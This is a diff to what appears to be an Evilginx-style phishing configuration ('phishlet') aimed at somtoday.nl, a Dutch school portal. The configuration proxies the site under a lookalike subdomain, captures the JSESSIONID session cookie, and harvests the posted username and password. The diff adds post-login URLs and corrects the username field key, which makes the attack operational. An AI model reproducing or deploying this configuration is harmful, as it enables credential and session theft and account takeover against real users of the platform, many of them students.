@@ -2,20 +2,28 @@ author: '@Jerp'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'elo', orig_sub: 'somtoday', domain: 'somtoday.nl', session: true, is_landing: true}
+
 sub_filters:
   - {triggers_on: 'somtoday.nl', orig_sub: 'somtoday', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+
 auth_tokens:
   - domain: 'somtoday.nl'
     keys: ['JSESSIONID=(.*).prod-authenticator-3,regexp']
+
+auth_urls:
+  - '/home/news'
+  - '/home/.*'   
+
 credentials:
   username:
-    key: 'organisatieSearchFieldPanel%3AorganisatieSearchFieldPanel_body%3AorganisatieSearchField'
+    key: 'AusernameField'
     search: '(.*)'
     type: 'post'
   password:
     key: 'ApasswordField'
     search: '(.*)'
     type: 'post'
+
 login:
   domain: 'somtoday.somtoday.nl'
   path: '/login'
